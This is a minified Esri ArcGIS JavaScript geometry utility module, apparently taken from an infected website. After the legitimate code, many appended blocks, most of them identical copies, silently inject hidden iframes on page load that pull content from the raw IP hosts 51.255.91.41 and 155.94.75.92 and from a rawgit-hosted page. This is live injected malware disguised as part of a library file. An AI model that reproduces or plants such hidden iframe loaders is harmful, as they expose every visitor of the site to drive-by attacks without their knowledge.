// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("esri/geometry/Point esri/geometry/Polyline esri/geometry/Polygon esri/geometry/webMercatorUtils dojo/Deferred dojo/_base/array dojo/_base/lang esri/geometry/geometryEngine esri/SpatialReference esri/geometry/scaleUtils".split(" "),function(B,y,z,l,C,D,A,g,v,E){var f={getProjectedGeometry:function(a,b,c){var e,d;e=new C;l.canProject(a,b)?(d=l.project(a,b),e.resolve(d)):c.project([a],b,function(a){d=a[0];e.resolve(d)});return e.promise},getDestinationPoint:function(a,b,c){var e=a.x*Math.PI/
180,d=b*Math.PI/180;b=Math.sin(d);var d=Math.cos(d),r=.9966471893352243*Math.tan(a.y*Math.PI/180);a=1/Math.sqrt(1+r*r);var f=r*a,m=Math.atan2(r,d),r=a*b,p=1-r*r,h=2.7233160610984375E11*p/4.040829998465916E13,g=1+h/16384*(4096+h*(-768+h*(320-175*h))),x=h/1024*(256+h*(-128+h*(74-47*h))),k,q,n,t=c/(6356752.314245*g),u,l=0;do h=Math.cos(2*m+t),k=Math.sin(t),q=Math.cos(t),n=x*k*(h+x/4*(q*(-1+2*h*h)-x/6*h*(-3+4*k*k)*(-3+4*h*h))),u=t,t=c/(6356752.314245*g)+n;while(1E-12<Math.abs(t-u)&&200>++l);if(200<=l)return console.log("Formula failed to converge"),
null;c=f*k-a*q*d;c=Math.atan2(f*q+a*k*d,.9966471893352243*Math.sqrt(r*r+c*c));p=2.0955066654848088E-4*p*(4+.003352810664775694*(4-3*p));e=(e+(Math.atan2(k*b,a*q-f*k*d)-.003352810664775694*(1-p)*r*(t+p*k*(h+p*q*(-1+2*h*h))))+3*Math.PI)%(2*Math.PI)-Math.PI;c=180*c/Math.PI;e=180*e/Math.PI;return new B(e,c,new v(4326))},getInverseCalculations:function(a,b){var c=b.x*Math.PI/180-a.x*Math.PI/180,e=.9966471893352243*Math.tan(a.y*Math.PI/180);a=1/Math.sqrt(1+e*e);var e=e*a,d=.9966471893352243*Math.tan(b.y*
Math.PI/180);b=1/Math.sqrt(1+d*d);var d=d*b,f,w,m,p,h,g,l,k,q,n=c,t,u=0;do{f=Math.sin(n);w=Math.cos(n);m=b*f*b*f+(a*d-e*b*w)*(a*d-e*b*w);m=Math.sqrt(m);if(0==m)return{distance:0,initialBearing:0,finalBearing:0};p=e*d+a*b*w;h=Math.atan2(m,p);g=a*b*f/m;l=1-g*g;k=p-2*e*d/l;isNaN(k)&&(k=0);q=2.0955066654848088E-4*l*(4+.003352810664775694*(4-3*l));t=n;n=c+.003352810664775694*(1-q)*g*(h+q*m*(k+q*p*(-1+2*k*k)))}while(1E-12<Math.abs(n-t)&&200>++u);if(200<=u)return null;n=2.7233160610984375E11*l/4.040829998465916E13;
u=n/1024*(256+n*(-128+n*(74-47*n)));c=Math.atan2(b*f,a*d-e*b*w);a=Math.atan2(a*f,-e*b+a*d*w);c=(c+2*Math.PI)%(2*Math.PI);a=(a+2*Math.PI)%(2*Math.PI);e=Number((6356752.314245*(1+n/16384*(4096+n*(-768+n*(320-175*n))))*(h-u*m*(k+u/4*(p*(-1+2*k*k)-u/6*k*(-3+4*m*m)*(-3+4*k*k))))).toFixed(3));c=180*c/Math.PI;a=180*a/Math.PI;return{distance:e,initialBearing:c,finalBearing:a}},getLineBetweenPoints:function(a){var b,c=[];D.forEach(a,A.hitch(this,function(a){c.push([a.x,a.y])}));0<c.length&&(b=new y({paths:[c],
spatialReference:{wkid:4326}}));return b},getAngleBetweenPoints:function(a,b){a=f.getInverseCalculations(a,b);return null===a?0:a.initialBearing},getDistanceBetweenPoints:function(a,b){a=f.getInverseCalculations(a,b);return null===a?0:a.distance},getLengthOfGeometry:function(a){return(a=g.simplify(a))?g.geodesicLength(a,9001):0},getAreaOfGeometry:function(a){var b;a=g.simplify(a);b={};a?(b.acres=g.geodesicArea(a,109402),b.squareMeters=g.geodesicArea(a,109404),b.squareFeet=g.geodesicArea(a,109405),
b.squareUSSurveyFeet=g.geodesicArea(a,109406)):(b.acres=0,b.squareMeters=0,b.squareFeet=0,b.squareUSSurveyFeet=0);return b},getPolyLineFromPaths:function(a){var b,c;b=new y(new v({wkid:4326}));for(c=0;c<a.length;c++)b.addPath(a[c]);return b},getPolygonFromPolyLines:function(a,b,c,e){var d,f,g;d=[];e=e?new z(new v(e)):new z(new v({wkid:4326}));for(f=0;f<a.length;f++)for(g=0;g<a[f].length;g++)d.push(a[f][g]);b?d.push(A.clone(d[0])):c&&(d[d.length-1][0]=d[0][0],d[d.length-1][1]=d[0][1]);e.isClockwise(d)||
d.reverse();e.addRing(d);return e},getPointsForArc:function(a,b,c,e){var d,g=[],l,m;d=b-a;b=parseInt(d,10);0>=b&&(b=1);l=Math.abs(d)/Math.abs(b);if(0<l)for(d=0;d<Math.abs(b)+1;d++)m=a+l*d,(m=f.getDestinationPoint(c,m,Math.abs(e)))&&g.push(m);return g},getArcParam:function(a){var b;b={};0>a.distance?0>a.radius?(b.bearing=a.initBearing+90,b.centerPoint=f.getDestinationPoint(a.chordMidPoint,b.bearing,a.centerAndChordDistance),b.startAngle=f.getAngleBetweenPoints(b.centerPoint,a.chordEndPoint),b.endAngle=
f.getAngleBetweenPoints(b.centerPoint,a.chordStartPoint)):(b.bearing=a.initBearing-90,b.centerPoint=f.getDestinationPoint(a.chordMidPoint,b.bearing,a.centerAndChordDistance),b.startAngle=f.getAngleBetweenPoints(b.centerPoint,a.chordStartPoint),b.endAngle=f.getAngleBetweenPoints(b.centerPoint,a.chordEndPoint)):0<a.radius?(b.bearing=a.initBearing+90,b.centerPoint=f.getDestinationPoint(a.chordMidPoint,b.bearing,a.centerAndChordDistance),b.startAngle=f.getAngleBetweenPoints(b.centerPoint,a.chordStartPoint),
b.endAngle=f.getAngleBetweenPoints(b.centerPoint,a.chordEndPoint)):(b.bearing=a.initBearing-90,b.centerPoint=f.getDestinationPoint(a.chordMidPoint,b.bearing,a.centerAndChordDistance),b.startAngle=f.getAngleBetweenPoints(b.centerPoint,a.chordEndPoint),b.endAngle=f.getAngleBetweenPoints(b.centerPoint,a.chordStartPoint));return b},removeNegativeExponents:function(a){return 1<a.toString().toLowerCase().split("e-").length?0:a},getChordLengthFromArcLength:function(a,b){var c;a=Math.abs(a);c=Math.PI*Math.abs(b);
b=Math.abs(b)*Math.sin(Math.abs(a)/Math.abs(b)/2);return a<=c?2*b:-2*b},getArcLengthFromChordLength:function(a,b){var c;c=Math.abs(a);b=Math.abs(b);c=2*Math.asin(c/(2*b))*b;0>a&&(c=2*Math.PI*b-c);return c},chordBearingToTangentBearing:function(a,b,c){var e;e=180/Math.PI*Math.acos(Math.abs(c)/2/Math.abs(b));b/=Math.abs(b);a=a+90*b-c/Math.abs(c)*b*e;return f.removeNegativeExponents(0>a?a+360:360<=a?a%360:a)},tangentBearingToChordBearing:function(a,b,c){var e;e=180/Math.PI*Math.acos(Math.abs(c)/2/Math.abs(b));
b/=Math.abs(b);a=a+90*b-c/Math.abs(c)*b*e;return f.removeNegativeExponents(0>a?a+360:360<=a?a%360:a)},getUnitValueForSR:function(a){switch(E.getUnitValueForSR(a)){case 1:return"meters";case 111194.87428468118:return"meters";case .3048:return"feet";case .3048006096:case .3048006096012192:return"uSSurveyFeet"}},getRotationAngleBetweenPoints:function(a,b){var c,e;a=l.project(a,new v(102100));b=l.project(b,new v(102100));c=b.x-a.x;a=b.y-a.y;b=180*Math.atan2(Math.abs(c),Math.abs(a))/Math.PI;e=180*Math.atan2(Math.abs(a),
Math.abs(c))/Math.PI;c=f.removeNegativeExponents(c);a=f.removeNegativeExponents(a);b=f.removeNegativeExponents(b);e=f.removeNegativeExponents(e);if(0===a){if(0===c)return 0;if(0<c)return 90;if(0>c)return 270}else if(0<a){if(0===c)return 0;if(0<c)return b;if(0>c)return 270+e}else if(0>a){if(0===c)return 180;if(0<c)return 90+e;if(0>c)return 180+b}},getScaleDistanceBetweenPoints:function(a,b){a=l.project(a,new v(102100));b=l.project(b,new v(102100));a=g.distance(a,b,9001);return f.removeNegativeExponents(a)}};
return f});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});